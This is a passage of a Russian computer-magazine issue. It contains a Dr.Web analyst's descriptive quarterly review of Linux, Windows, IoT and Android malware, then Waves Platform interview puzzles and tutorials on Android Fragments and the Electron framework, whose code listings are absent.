Ну и напоследок картинки из IDA Pro





                                                 Получим вызов kernel-based





                           Обращаем внимание на смещение peb + 30h & 0ch offset





                                                             Листинг функции

ЗАКЛЮЧЕНИЕ
Поздравляю, ты прошел боевое крещение и стал крутым крэкером устаревшей
малвари :). Конечно, до настоящего аналитика еще долгая дорога, но ты уже
смог разобраться, как можно, используя разнообразные инструменты и под-
ходы, самостоятельно изучать любые образцы малвари.
  В следующих статьях нас ждут крутые и более сложные вредоносы.
  Всем удачи в исследованиях!


                    INFO

                            Анализ каждого отдельного образца malware — это часто
                             творческий процесс. Заранее трудно предугадать,
                               что ждет исследователя впереди. Используй как можно
                          больше инструментов и методов для всестороннего
                             анализа и получения исчерпывающего заключения
                           о функциональности.
MALWARE

     САМАЯ
   ИНТЕРЕСНАЯ
 МАЛВАРЬ
ЗА КВАРТАЛ

              КРУТЫЕ
         ОСЕННИЕ УГРОЗЫ
          ДЛЯ LINUX, WIN,
              IOT И ANDROID

                                                                                   Павел Шалин
                                                                                                            аналитик,
                                                                                                   «Доктор Веб»





Есть у специалистов по информационной безопасно-
сти такое развлечение: установить Linux на виртуалку или
даже на реальное железо, настроить в системе аутенти-
фикацию по логину и паролю вроде admin/admin либо root/
test, выставить получившееся произведение искусства
в Сеть и наблюдать за происходящим. Такая инсталля-
ция (или перформанс — все время их путаю) называет-
ся ханипот, от английского слова honeypot — «горшочек
с медом». Ибо на такой девайс со всех окраин интернета,
словно пчелы на мед, тут же слетаются любители взламы-
вать все, что плохо лежит. А исследователи, радостно по-
тирая руки, начинают изучать то, что к этому самому «гор-
шочку» прилипло.


ХАНИПОТ С ЛИНУКСОМ
За минувший квартал на ханипоты нашей вирусной лаборатории с установлен-
ным Linux было совершено 385 829 успешных атак, из них 139 298 осуществля-
лись по протоколу SSH и 246 531 — по Telnet. В первом случае самыми ходо-
выми логинами для брута были admin, ubnt, root, pi, test, support и git, во втором
к этому ассортименту добавились еще guest, tech, supervisor и administrator.
Обрати внимание: Telnet у атакующих пользуется практически вдвое большей
популярностью, чем SSH. С чего бы?


...все, кто считает, что троянца на Linux нужно предварительно собрать из ис-
ходников и обязательно запустить из-под root’а, несколько отстали от жизни



Одной из причин этого удивительного явления может быть необычайный рост
популярности троя, известного под именем Linux.Mirai, которого в последнее
время берут на вооружение все кому не лень. Эта вредоносная программа,
появившаяся на свет еще в мае 2016 года, предназначена для организации
DDoS-атак и способна работать на множестве устройств с архитектурой х86,
ARM, MIPS, SPARC, SH-4 и M68K. Понятно, что среди таких девайсов встреча-
ются и роутеры, и IP-камеры, и сетевые хранилища, сидящие на «толстом ка-
нале». Установив на подобное устройство DDoS-троянца, можно без проблем
генерировать огромное количество флуд-запросов. Linux.Mirai умеет сканиро-
вать уязвимые Telnet-хосты, генерируя случайным образом IP-адреса, а если
обнаруживает такой, начинает ломиться на стандартные порты, перебирая ло-
гины и пароли по словарю. Ну а после того как исходники Mirai попали в па-
блик, в Сети словно прорвало плотину: тысячи юных гениев решили пополь-
зоваться халявной технологией, благо для этого нет никакой необходимости
напрягать извилины и что-то придумывать самостоятельно. Кстати, в одном
из перехваченных нами недавно заданий ботнету Mirai была отдана команда
ддосить веб-сайт с примечательным адресом — http://fbi.gov. Видно, кому-то
бравые фэбээровцы больно наступили на хвост.
  Помимо Mirai, сетевые злодеи льют на ханипоты три вида малвари: это
загрузчики, качающие на скомпрометированные устройства другой вредо-
носный хлам, и троянцы для организации DDoS-атак и прокси-серверов. По-
следние, понятное дело, используются в целях анонимности. Вот наиболее
распространенная малварь, попадавшая на заботливо подготовленные нами
Linux-машины в течение трех осенних месяцев 2016 года:





                                              Распределение малвари для Linux

Среди этого разнообразия вредоносных программ следует особо отметить
забавную зверушку под названием Linux.Hajime. Это червь, ориентированный
в первую очередь на IoT, то есть на пресловутый «интернет вещей». Hajime
тоже использует для своего распространения Telnet: сканирует Сеть и пыта-
ется подключиться к 23-му порту обнаруженных устройств, последовательно
перебирая пароли. После успешной авторизации плагин-инфектор скидыва-
ет на устройство хранящийся в нем загрузчик для архитектур MIPS/ARM, на-
писанный на ассемблере. Загрузчик выкачивает с машины, с которой велась
атака, основной модуль троя, который включает устройство в децентрализо-
ванный P2P-ботнет. На финальном этапе этот компонент получает от ботово-
дов конфигурационный файл и снова запускает сканирование Сети для сво-
его дальнейшего распространения. Кто сказал, что сетевых червей для Linux
не существует в природе? Садись, два!
   К слову, помимо Hajime, в последнее время появилось множество разно-
образных ассемблерных загрузчиков для архитектур MIPS/ARM, например
Linux.BackDoor.Remaiten или Linux.Nyadrop, используемый для загрузки в за-
раженную систему троянца Linux.Luabot.
   Вообще, этой осенью вирусным аналитикам удалось собрать богатый уро-
жай Linux-малвари. Вот, например, Linux.BackDoor.Irc.16. Мало того что этот
троянец общается с С&C-сервером по протоколу IRC, как в старые добрые
времена (эта незамысловатая технология помнит молодым шалопаем еще
дедушку Торвальдса), так ко всему прочему он еще и написан на Rust. Если
ты не в курсе, первая стабильная версия этого языка программирования
от Mozilla Research вышла совсем недавно — 15 мая 2015 года, и вот вирусо-
писатели уже приспособили его к делу.





                             Дешево и сердито: управление троянцем через ирку

В октябре был обнаружен бэкдор Linux.BackDoor.FakeFile.1. Как и другие бэк-
доры, это творение неизвестных вирусописателей может выполнять на зара-
женной машине различные команды: скачивать, загружать на удаленный сер-
вер и удалять файлы, организовать backconnect и запустить sh — в общем,
мелко пакостить традиционными способами. Примечательно, что FakeFile
не требует на зараженной машине привилегий root, он может превосходно ра-
ботать с правами текущего пользователя. Так что все, кто считает, что троян-
ца на Linux нужно предварительно собрать из исходников и обязательно запу-
стить из-под root’а, несколько отстали от жизни. Технологии движутся вперед
семимильными шагами! О чем все это говорит? Только о том, что популяр-
ность Linux среди вирмейкеров растет, а значит, эта система понемногу вы-
ходит из категории «забавной игрушки для гиков» и постепенно превращает-
ся в «удобную и надежную платформу для использования широкими слоями
населения», чему весьма способствует появление большого количества ра-
ботающих на Linux бытовых устройств. Ведь количество малвари для той или
иной ОС определяется, в общем-то, только одним фундаментальным параме-
тром — распространенностью этой системы.

WINDOWS: ИНТЕРЕСНЕНЬКОГО ВСЕ МЕНЬШЕ
А что там с виндой? Ее золотые годы, похоже, понемногу уходят в про-
шлое. По крайней мере, количество интересных образцов вредоносного
ПО для этой системы, поступивших в вирлаб за три осенних месяца, можно
пересчитать по пальцам одной руки. Вот, например, Trojan.Encoder.6491. Вро-
де бы самый обычный энкодер, шифрует файлы на компьютере пользователя
и просит заплатить выкуп. Но есть в нем несколько любопытных особенностей.
Во-первых, написан он на созданном парнями из Google языке Go (который
в последнее время почему-то пользуется повышенным спросом у вирмейке-
ров). Во-вторых, Trojan.Encoder.6491 с определенным интервалом проверяет
баланс Bitcoin-кошелька, на который жертва должна перевести средства. За-
фиксировав денежный перевод, энкодер автоматически расшифровывает все
зашифрованные ранее файлы с использованием встроенной в него функции.
Именно потому, что алгоритм восстановления файлов вшит в код самого тро-
янца, вытащить его оттуда и придумать на его основе «лекарство» для наших
аналитиков не составило особого труда. После чего бизнес у создателей это-
го шифровальщика, судя по всему, как-то не заладился.





                       С неземными богатствами у киберзлодеев что-то не задалось

Еще один Windows-троянец под названием BackDoor.IRC.Medusa.1 предназна-
чен для организации DDoS-атак и также использует олдскульный протокол IRC.
Вирусные аналитики «Доктор Веб» полагают, что именно эта малварь исполь-
зовалась в ходе массированных атак на Сбербанк России, о которых расска-
зывали недавно СМИ. Meduza умеет выполнять несколько типов DDoS-атак,
а также по команде загружать и запускать на зараженной машине исполняе-
мые файлы.
   Если судить по логам Medusa, извлеченным из IRC-канала, на котором
ботнету раздаются команды, в ноябре этот трой успел поучаствовать в атаках
на Росбанк, Росэксимбанк и некоторые другие уважаемые организации.





                               Подглядывать, конечно, нехорошо... но так интересно!

Ничем другим этот троянец не примечателен — за исключением разве что того
обстоятельства, что разработчики сейчас усиленно пытаются продвигать его
на всевозможных подпольных площадках.

А КАК НАСЧЕТ APT?
Целенаправленные, или таргетированные, атаки — явление, встречающееся
в дикой природе нечасто. Так, в 2011 году наши вирусные аналитики обнару-
жили троянца BackDoor.Dande, воровавшего информацию о закупках лекарств
из специализированных фармацевтических приложений и самостоятельно вы-
пиливавшегося с зараженного компа, если таких программ на нем не обна-
руживалось. Спустя четыре года был выявлен BackDoor.Hser.1, атаковавший
оборонные предприятия. Еще вспоминаются троянцы, воровавшие у пользо-
вателей Steam ценные игровые предметы, чтобы потом продать их другим лю-
бителям многопользовательских игрушек. И вот это случилось опять: в ноябре
был пойман и исследован трой BackDoor.Crane.1, основной целью которого
были... подъемные краны!
   Ну, не сами краны, конечно, а российские компании, которые эти краны
производят и продают. BackDoor.Crane.1 успешно крал у них финансовые до-
кументы, договоры и деловую переписку сотрудников. Остановить зловредную
программу удалось только благодаря бдительности специалистов по инфор-
мационной безопасности.
   BackDoor.Crane.1 любопытен тем, что его создатели, судя по всему, непре-
взойденные виртуозы художественного копипастинга. Как минимум они заим-
ствовали фрагменты кода с сайта rsdn.org (о чем говорит User-Agent, которым
«представляется» трой, — RSDN HTTP Reader), а кроме того, забыли убрать
из ресурсов невидимое окошко, явно доставшееся коду в наследство от ка-
кой-то другой разработки:
   BackDoor.Crane.1 использует несколь-
ко модулей на Python, один из которых вы-
полняет фактически тот же самый набор
функций, что и основная программа. Та-
кое ощущение, что троянца писали сразу
две конкурирующие команды разработ-
чиков в рамках одной школьной олимпиа-
ды по программированию. При этом одна    Жалко, разработчики не оставили
из команд знает Python, а другая делает    своих контактных данных
вид, что знает С++. Однако ж, каким бы
хроменьким и кривоватым ни вышел, свои задачи он выполнял успешно. Ровно
до тех пор, пока его не добавили в вирусные базы.

ANDROID ВСЕГДА ПОПУЛЯРЕН!
Что же касается пользователей Android, то они по-прежнему находятся под
прицелом вирусописателей. В сентябре была обнаружена новая модификация
троянца семейства Android.Xiny, способная внедряться в системные процессы
ОС Android.





  Любовь андроидных троянцев внедряться в системные процессы вызывает беспокойство

Основная задача Android.Xiny.60 — грузить на планшет или смартфон другую
малварь, пока пользователь рассматривает в интернете котиков и общается
в «Одноклассниках». Кроме того, он может показывать на экране надоедливую
рекламу. Для инжектов вредоносной библиотеки igpld.so в процессы систем-
ных приложений Google Play (com.android.vending) и сервисы Google Play (com.
google.android.gms, co.google.android.gms.persistent) трой использует специ-
альный модуль igpi. Кроме того, эта библиотека может внедряться и в систем-
ный процесс zygote, однако в текущей версии троянца эта функция не исполь-
зуется. Если инжект прошел успешно, Xiny может загружать и запускать
вредоносные плагины, которые после скачивания будут работать как часть
того или иного атакованного приложения.
   А в ноябре аналитики «Доктор
Веб» выявили  в  каталоге Google
Play   троянца-дроппера   Android.
MulDrop.924,    которого    скача-
ли  более  миллиона  владельцев
Android-смартфонов   и   планше-
тов под видом приложения Multiple
Accounts: 2 Accounts. Этот троянец
имеет необычную модульную архи-
тектуру. Часть ее реализована в виде
двух вспомогательных компонентов,
которые зашифрованы  и  спрята-
ны внутри картинки в формате PNG.
При запуске троянец извлекает и ко-
пирует эти модули в свою локаль-
ную директорию в разделе  /data,
после чего загружает их в память.
Впрочем, такой любопытный под-
ход к хранению полезной нагрузки
встречался и раньше: еще в январе
2016 года мы обнаружили троянца
Android.Xiny.19.origin,   хранившего
часть своих компонентов в картин-
ках. Помнишь старую шутку про гра-
фический файл с вирусом внутри?
Так вот, она понемногу перестает
быть смешной.                          За красивой рекламой часто таится подвох

ЗАКЛЮЧЕНИЕ
Как бы то ни было, вредоносных программ меньше не становится, а значит,
в будущем нас ждут новые, не менее интересные и увлекательные обзоры.
Ну а я традиционно желаю здоровья вам, вашим компьютерам, смартфонам,
планшетам и прочим полезным устройствам.
КОДИНГ





                                       Александр Лозовский
 ЗАДАЧИlozovsky@glc.ru
  НА СОБЕСЕДОВАНИЯХ

      ЗАДАЧИ ОТ WAVES PLATFORM
     И НАГРАЖДЕНИЕ ПОБЕДИТЕЛЕЙ
      ОТ POSTGRES PROFESSIONAL



Когда в описании компании присутствуют такие те-
плые слова, как «блокчейн», «эмиссия», «токены»
и «криптоплатформа», а в качестве подарков читате-
лям — победителям задач они предлагают криптова-
люту, у нас не остается никаких сомнений. Такие за-
дачи надо публиковать!




ПОДАРКИ ПЕРВОЙ ТРОЙКЕ ПОБЕДИТЕЛЕЙ
Первый, кто правильно решит все задачи и пришлет свои ответы по указанно-
му адресу, получит 1000 Waves (это примерно 230 долларов / 15 000 рублей,
на основе данных), второго и третьего призеров ждут фирменные поло и сти-
керы Waves. Для получения приза победителю необходимо будет сделать ко-
шелек на Waves и прислать его адрес.

Waves Platform — децентрализованная платформа для проведения крауд-
фандинга и выпуска цифровых ценностей. Криптоплатформа Waves нацелена
на эмиссию, торговлю и обмен активами / собственными токенами на блок-
чейне. В 2016 году Waves завершила ICO (Initial Coin Offering — публичная про-
дажа монет), в ходе которого собрала более 16 миллионов долларов. По раз-
меру краудфандинговых инвестиций она вошла в топ-10 самых успешных
blockchain-проектов. Сейчас компания находится в стадии активного развития,
они набирают новых членов команды, и каждый из соискателей проходит те-
стирование. Примеры тестовых заданий — в этой статье. Попробуй себя, полу-
чи шанс выиграть немного (на самом деле нормально так ;)) криптовалюты!

КОЛЛИЗИЯ
Блоки в биткойне создаются каждые десять минут, при этом хеш SHA-256
от блока должен начинаться с D нулей, где D на данный момент — D<sub>0</
sub>~70 и каждый год растет на 4. Оцените, в каком году будет впервые най-
ден блок, хеш которого уже встречался в блокчейне биткойна.

СВОЙСТВА
Каким из этих свойств не обладает биткойн?
•  Вероятность у разных участников иметь разные префиксы, отбросив по-
   следние k блоков, экспоненциально убывает с k
•  Участник, обладающий x% голосующей мощности, создаст не больше ax%
   блоков
•  Блокчейн растет со временем
•  Только владелец приватного ключа может создать валидную подпись тран-
   закции

Как этого планируют добиться в биткойне?

ЗАДАЧА
Посчитать количество уникальных перестановок фигур на шахматной доске
размером 6 на 9 клеток: двух королей, одного ферзя, одного слона, одной
ладьи и одного коня — так, чтобы ни один из них не бил другого (цвет фигур
не имеет значения). Решение должно работать до трех минут на среднестати-
стическом ноутбуке.

КУДА СЛАТЬ ОТВЕТЫ?
Ответы можно присылать на evelina@wavesplatform.com.

НАГРАЖДЕНИЕ ПОБЕДИТЕЛЕЙ
Официальную церемонию награждения победителей задач от Stack Group мы
проведем в следующем номере.
   Оставайся тунцом!

IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!
Миссия этой мини-рубрики — образовательная, поэтому мы бесплатно публи-
куем качественные задачки, которые различные компании предлагают соиска-
телям. Вы шлете задачки (lozovsky@glc.ru) — мы их публикуем. Никаких актов,
договоров, экспертиз и отчетностей. Читателям — задачки, решателям — по-
дарки, вам — респект от нашей многосоттысячной аудитории, пиарщикам —
строчки отчетности по публикациям в топовом компьютерном журнале.
КОДИНГ





                                                                              Андрей Пахомов
                                                                                              mailforpahomov@gmail.comКРАСОТА
ИЗ ФРАГМЕНТОВ

КАК УЛУЧШИТЬ UI В ANDROID
C ПОМОЩЬЮ КЛАССА FRAGMENT





 Создать хороший UI сложно, особенно если у тебя еще
 не так много опыта в этой области. Поэтому вот тебе бы-
 стрый тест на знание вопроса: если ты привык, что для но-
 вого окна обязательно нужен Activity или вместо плавной
 анимации в свеженаписанной программе почему-то про-
 исходят конвульсии, — эта статья для тебя :).

 ГРАБЛИ ACTIVITY
 Большинство туториалов, демонстрирующих фишки Android-разработки, на-
 чинаются одинаково: неопытным разработчикам предлагают накидать все ви-
 зуальные элементы прямо в XML-разметку главного Activity. Выглядит это при-
 мерно так:





 Такая проектировка входит в привычку, и проект заполняется новыми Activity
 со все более сложной разметкой. Как итог — даже минимально полезное
 приложение обрастает стеком Activity, сжирающим всю оперативную память,
 а в разработчика летят камни и двойки в Google Play.
   Сегодня я хочу поделиться с тобой широко известным «секретом»: Activity
 совсем не предназначены для массового использования. Наоборот, в при-
 ложении это штучный инструмент, который идет в ход только в крайних слу-
 чаях. Повсеместная генерация новых Activity создает серьезные проблемы,
 которые делают работу приложения непредсказуемой. И даже если на твоем
 устройстве все стабильно, в мире немыслимое количество Android-устройств,
 на большинстве из которых твое приложение будет падать.
   А все потому, что ОС Android совершенно не обещает держать твои Activity
 живыми. Как ты помнишь, эти компоненты существуют независимо друг от дру-
 га, обладая особым жизненным циклом. Если Activity переходит в состояние
 onPause, а происходит это довольно часто, он становится котейкой Шредин-
 гера: нельзя заранее знать, будет он жив или нет.
    Используя дополнительные Activity для вывода меню и других мелочей,
 ты подвергаешь опасности все логические связи внутри приложения. Activity
 собираются в стек, и ОС может начать выгружать их по одному или группой.
 Когда пользователь захочет вернуться в предыдущее окно, Activity может уже
 быть уничтожен, и юзер выпадет из приложения.
   Кроме проблем с сохранением логики, есть и рутина поддержки ООП-ко-
 да: плотно завязанные на Activity интерфейсы практически невозможно разви-
 вать дальше. Масштабирование, быструю замену одних элементов на другие,
 анимацию — все это будет очень тяжело реализовать в новых версиях прило-
 жения.
    Благодаря моде на единую экосистему все мобильные приложения ста-
 ли в целом очень похожи. Стоит только нащупать тропинку да немного по-
 тренироваться, и тогда качество начинает быстро расти. Следуя принципу
 «критикуя — предлагай», мы сейчас напишем приложение, реализующее уни-
 версальный пользовательский интерфейс. Это будет интересно не только
 с академической точки зрения — уверен, написанный сегодня код ты сможешь
 легко встроить в свои проекты. Итак, начнем!

 FRAGMENTS
 Чтобы работать с UI было проще и быстрее, Google создала фрагмент
 (Fragment) — класс — прослойку между Activity и визуальными составляющи-
 ми программы. С одной стороны, это контейнер для любых View-объектов, ко-
 торые могут быть показаны пользователю. С другой — продолжение Activity,
 от которого Fragment получает всю информацию об изменениях в жизненном
 цикле.
   У фрагментов, как и у Activity, есть свой (правда, более оригинальный) жиз-
 ненный цикл. К примеру, работать с UI сразу после создания фрагмента не-
 возможно, нужно ждать загрузки всех элементов — после метода onCreate
 выполнится метод onCreateView, где и можно будет загрузить элементы.





 В фрагменте тоже можно переопределять любые методы, отслеживающие со-
 стояние окна. Так, если приложение уйдет в фон, в Activity выполнится onPause,
 а затем метод с точно таким же названием выполнится здесь. Это может быть
 полезно — удобно для отключения от сторонних объектов, например привя-
 занных сервисов (bound service).

 FRAGMENTTRANSACTION
 Зная, что работа с фрагментами будет насыщенной, Google заблаговремен-
 но создала для этого специальные инструменты. Классы FragmentManager
 и FragmentTransaction аккумулируют в себе все процессы: создание новых
 фрагментов и их удаление, передачу данных и так далее.
   Объект FragmentManager создавать не нужно, он уже есть в каждом Activity,
 нужно только получить на него ссылку. А все действия будут проходить через
 FragmentTransaction, который затем самостоятельно передаст данные ме-
 неджеру фрагментов.



 Хочу заметить, что классы, работающие с фрагментами, доступны в двух ва-
 риантах. Рекомендую использовать более новую версию — это те, у которых
 в пути импорта присутствует строчка android.support.v4. Это большая библио-
 тека, созданная для организации обратной совместимости. Компания Google
 бережно относится к устройствам на всех версиях ОС, а библиотеки позволя-
 ют использовать новшества разработки даже при работе со старым API.




 FRAMELAYOUT
 Часто данные в UI приходят динамически, в зависимости от происходящих со-
 бытий. Чтобы было куда поместить картинку или текст, существует специаль-
 ный контейнер — FrameLayout. В этом и есть его основная задача — заре-
 зервировать на экране место для любого объекта класса View, который можно
 будет подгрузить позднее. Фрагменты тоже живут в таких контейнерах.





 Добавить   новый   фрагмент   в   FrameLayout   можно   по-разному:
 в FragmentTransaction доступны схожие по функциональности методы замены
 (replace) и добавления (add).


 Несмотря на внешнюю схожесть, нужно хорошо понимать, какого результата
 ты можешь добиться. Метод replace работает очень просто — добавит фраг-
 мент и, если в контейнере раньше что-то было, удалит старые фрагменты.


 Метод add же создает стек из фрагментов,
 и каждый новый вызов помещает на верх стека
 новый экземпляр. Важно, что при появлении
 нового фрагмента старые объекты в стеке
 не получают никаких оповещений и работают
 так, как будто бы ничего не произошло. Это
 значит, что метод onPause для них не выпол-
 нится и они продолжат расходовать ресурсы
 устройства, хотя пользователь перестанет их
 видеть.
    Такая растрата выделенной памяти бывает
 оправданна, например если хочется организо-
 вать предобработку данных: фрагмент может
 что-нибудь подгрузить, пока будет незаметен,
 а потом показать уже готовый результат.
   Действий с фрагментами может быть не-
 сколько, они будут аккумулироваться до тех
 пор, пока не выполнится метод commit.



                                                  Сменяемые фрагменты

 СМЕНА ФРАГМЕНТОВ
 Довольно часто нужно понять, какой именно фрагмент сейчас был показан
 пользователю. Самый очевидный способ — завести в Activity переменную, за-
 поминающую номер фрагмента, выведенного на экран. Но с таким подходом
 фрагменты становятся жестко привязаны к экземпляру Activity, и, как только
 он будет уничтожен ОС, счетчик фрагментов будет утерян.
   Метод onDestroy, выгружающий Activity из памяти, выполняется не толь-
 ко когда приложение завершает работу, но и при перевороте экрана. Горя-
 чие головы на Stack Overflow рекомендуют на первый взгляд удобное решение
 этой проблемы — просто запретить ОС пересоздавать объект при повороте.
 Для этого нужно всего лишь подправить в манифесте описание Activity.





 Но этот подход работает ровно до тех пор, пока в приложении нет отдельно-
 го дизайна для портретной и альбомной ориентаций экрана: новый XML-файл
 подгрузится только вместе с созданием нового экземпляра Activity, в методе
 onCreate. Конечно, можно придумать костыли и на этот случай, но есть вари-
 ант проще.
   Фрагментам можно назначать уникальные теги, по которым возможно вы-
 числить тот, что сейчас видит пользователь. Теги задаются в тех же методах
 replace и add дополнительным параметром.





 Это удобно, поскольку в полноценном UI будет несколько фрагментов, и в за-
 висимости от ситуации их нужно будет чередовать на экране.





 PORTRAIT & LANDSCAPE
 Раз уж всплыла тема особого UI для альбомной ориентации, посмотрим,
 как это реализовать с помощью фрагментов. Напомню, что файлы XML-раз-
 метки для разных типов экрана должны иметь одинаковое имя, но распола-
 гаться в папках с особыми именами. В частности, альбомную верстку нужно
 поместить в папку landscape-land.
    Поскольку пространства стало больше, можно поместить рядом сразу не-
 сколько фрагментов. Это будет еще один, третий фрагмент, явно указанный
 в XML-коде.





 Он появится только при повороте экрана, но будет работать точно так же,
 как и любой другой, загруженный через контейнер FrameLayout.


                                                          Дополняем UI
                                                               третьим
                                                           фрагментом





 АНИМАЦИЯ
 В мире Material Design важное место занимают плавные переходы между эле-
 ментами UI. Если построить дизайн на основе фрагментов, организовать ани-
 мацию будет просто.



 В данном случае появление фрагмента будет сопровождаться эффектом по-
 степенного проявления (fade_in). Если на экране будет какой-то другой фраг-
 мент, то он так же плавно исчезнет (fade_out).
   В Android уже есть заготовленные сценарии анимации, которых тебе навер-
 няка хватит. Но можно создать и свой вариант, описав движения в привычном
 формате XML. Выглядеть это будет примерно так:





 «Оживлять» фрагменты намного проще, чем целые  Activity. Запуск нового
 окна — трудоемкий процесс, который не так легко анимировать. К примеру,
 для новых экранов fade-эффекты практически не используются, так как они бу-
 дут очень плохо выглядеть на слабых устройствах. А меняя один фрагмент дру-
 гим, ты перерисовываешь только часть экрана, и, значит, ресурсов тратится
 меньше.

 RETAINEDFRAGMENT
 Ты уже знаешь, что многопоточная разработка требует повышенного внима-
 ния, иначе можно потерять все вычисления и осложнить жизнь сборщику мусо-
 ра. Мы уже раньше разбирали, насколько опасным может быть пересоздание
 Activity, в случае с фрагментами ситуация та же самая: нужно сохранять связь
 между новыми компонентами и дополнительными потоками.
   Для фрагментов сохранять связи легче — и это еще один повод отка-
 заться от Activity. Достаточно только при создании фрагмента вызвать метод
 setRetainInstance.





 Теперь при повороте экрана ОС «сохранит» фрагмент, и все дополнительные
 потоки вернут результат именно в тот фрагмент, который видит пользователь.
 Кстати, благодаря реактивному программированию код стал гораздо проще.




 Но вообще, это не совсем сохранение: в оригинале это называется Retain
 (помнить, удерживать), и смысл происходящего отличается от привычного
 Save.
    Хотя RetainedFragment и сохранит идентификаторы того фрагмента, кото-
 рый был до поворота экрана, его содержимое, скорее всего, будет потеряно.
 Данные, отображаемые во View-элементах, будут утрачены, поэтому о них нуж-
 но позаботиться самостоятельно.
    Конечно, в некоторых случаях все не так печально. К объектам из базовых
 классов можно добавить специальный параметр:


 Тогда, к примеру, EditText и TextView сохранят свои данные самостоятельно.
 Но это точно не сработает с самописными View-объектами, а может не срабо-
 тать и с базовыми. К счастью, у нас есть печеньки и сериализация!

 BUNDLE
 Уверен, ты уже не раз встречал этот класс как удобный способ сериализации
 (сохранения в мире ООП) данных. Чтобы было что восстанавливать, нужно
 данные сначала сохранить — для этого в фрагментах доступен специальный
 метод, вызываемый перед выгрузкой фрагмента из памяти.





 Как ты видишь, здесь система уже не только что-то сохраняет для себя,
 но и позволяет программисту добавить данные. При создании фрагмента они
 будут доступны в методе onViewStateRestored или уже использованном нами
 onCreateView.





 Естественно, фрагменты можно снабжать и стартовым набором параметров,
 которые потом будут доступны точно таким же способом.





 ВЗАИМОДЕЙСТВИЕ
 Приложение должно уметь перекидывать данные из компонента в компонент,
 и с этим у фрагментов все хорошо. Передавать данные между Activity и фраг-
 ментом возможно в любой момент времени, в том числе и во время их актив-
 ной работы. Делается это по всем канонам ООП — сначала получить ссылку
 на объект, а затем спокойно вызывать его методы.
    Поскольку Activity самостоятельно создает фрагмент, для доступа к его
 методам этого достаточно. Для обратной связи фрагменту нужно как-то уз-
 нать, какой именно Activity сейчас работает, — для таких целей создан метод
 onAttach.





 Этот метод вызывается ОС при создании фрагмента и позволяет получить кон-
 текст приложения. Контекст дает возможность не только пользоваться всеми
 ресурсами приложения, но и добраться до сгенерировавшего вызов Activity.
 Получая доступ к контексту или Activity, нужно быть очень внимательным и уда-
 лять ссылки, когда эти объекты больше не нужны: если есть хотя бы одна ссыл-
 ка, сборщик мусора оставит объект в памяти.
   Опять же, в целях экономии Google просит разработ-
 чиков не связывать фрагменты между собой напрямую,
 а использовать Activity в качестве посредника. В против-
 ном случае велик риск запутаться в уничтоженных и еще
 живых  элементах  UI и  перерасходовать выделенную
 устройством память.
                                    WWW
 OUTRO
                                                                Еще о фрагментах Уверен, после этой статьи ты станешь с большим пие-                                                                               (лучше читать
 тетом относиться к базовым компонентам ОС и реже их       на английском)
 использовать. Фрагменты позволяют создавать удобный
                                                                            Многопоточность и гибкий UI, так что дизайнеры будут рады, если те ста-                                                                                    в Android
 нут основой интерфейсов. А в качестве примера для под-
 ражания всегда помни про приложение Google Play — во         А статью
 время его работы генерируется всего один Activity!                о реактивном
                                                                        программировании
   Обязательно скачай с нашего сайта исходники разо-                                                                              читай в предыдущем
 бранного примера — полноценный листинг читается и за-          номере
 поминается легче. Если остались какие-то вопросы или
 предложения с замечаниями :), пиши мне. Удачи!
КОДИНГ
ELECTRON’НАЯ
 МУЗЫКА





      ПРЕВРАЩАЕМ SOUNDCLOUD
      В МОБИЛЬНОЕ ПРИЛОЖЕНИЕ
      С ПОМОЩЬЮ КРУТЕЙШЕГО
           ФРЕЙМВОРКА





                                     Александр Лыкошин

Фреймворк Electron разработан в GitHub и носил раньше название Atom
shell. Пожалуй, самое известное приложение, написанное с его помощью, —
текстовый редактор Atom, а еще — клиент Slack для настольных компьютеров,
которым очень активно пользуются в нашей редакции. Из других интерес-
ных проектов — мультипротокольный клиент мгновенных сообщений Franz,
Git-клиент GitKraken, GUI-клиент к хорошо известной Node.js-разработчикам
утилите Yeoman yeoman-app и даже Microsoft Visual Studio Code.
   Electron позволяет создавать кросс-платформенные приложения для на-
стольных компьютеров с использованием чистого JavaScript. Поддержива-
ются основные операционные системы: macOS, Linux, Windows. Он сочетает
в себе лучшие стороны Node.js и  Chromium, но при этом ориентирован
на разработку десктопных приложений.
  Само собой напрашивается сравнение Electron с проектом Cordova, ко-
торый аналогичным образом позволяет превратить веб-приложение в мо-
бильное приложение для основных мобильных платформ. Так когда же нам мо-
жет пригодиться именно Electron? Варианты следующие:
•  если требуется кросс-платформенное приложение с ма-
  лыми затратами на разработку и сопровождение;
•  если есть готовое веб-приложение или веб-компонент,
   который необходимо распространять в виде законченно-
   го приложения для настольных компьютеров;
•  если веб-приложению требуются права, выходящие                                    WWW
   за рамки ограничений системы безопасности браузеров;     Документация
                                                                        на Electron•  если веб-приложение должно требовать большей инте-
   грации с операционной системой и доступа к API, невоз-                                                                      Перевод
   можного из браузера.                                           на русский язык

ЧТО БУДЕМ ДЕЛАТЬ
Мы возьмем готовый виджет, «обернем» его в приложение Electron и до-
бавим стандартные элементы интерфейса операционной системы, такие
как иконка в области уведомлений, стандартные системные диалоги, вызов
внешнего приложения, главное меню, горячие клавиши.
   Для  наших  экспериментов  возьмем  готовый  виджет  платформы
SoundCloud, популярной площадки для публикации музыкальных композиций
и другого аудиоконтента. Этот виджет обладает несложным API, да и мож-
но будет немного поразвлечься прослушиванием музыки. Мы превратим его
в простой проигрыватель для настольного компьютера с привычными элемен-
тами управления.

ПОДГОТОВКА

Иконки
Для приложения нам понадобится несколько иконок. Я брал их из набора ie_
Bright с сайта iconfinder.com; можно взять другие на свой вкус. Для изображе-
ний, используемых для иконки в области уведомлений под Windows, рекомен-
дуются файлы .ico, но мы для простоты возьмем только PNG-файлы.

  Имя файла            Назначение           Изображение

   player.png           Иконка приложения


    play.png            Начать проигрывание


    pause.png              Приостановить


    prev.png         Предыдущая композиция


    next.png         Следующая композиция


Поместим иконки в подкаталог assets/img/ проекта.

Node.js
Предполагается, что на компьютере установлен Node.js версии не ниже 6.6;
загрузить ее можно здесь.

$ node -v
v6.6.0


Операционная система
Примеры подготовлены для выполнения на компьютере, работающем под
управлением ОС Linux и macOS.

МИНИМАЛЬНОЕ ПРИЛОЖЕНИЕ ELECTRON
Начнем с создания минимального приложения Electron. Для этого создадим
каталог проекта, например electron-demo, и перейдем в него:

$ mkdir electron-demo
$ cd electron-demo

Добавим в наш проект два файла — минимальный index.html, который будет
основным интерфейсом нашего приложения:





и index.js со следующим содержимым:





Инициализируем файл package.json проекта менеджера пакетов npm, отве-
тив на необходимые вопросы.

$ npm init

Нужно проверить, что в package.json, получившемся в результате, значение
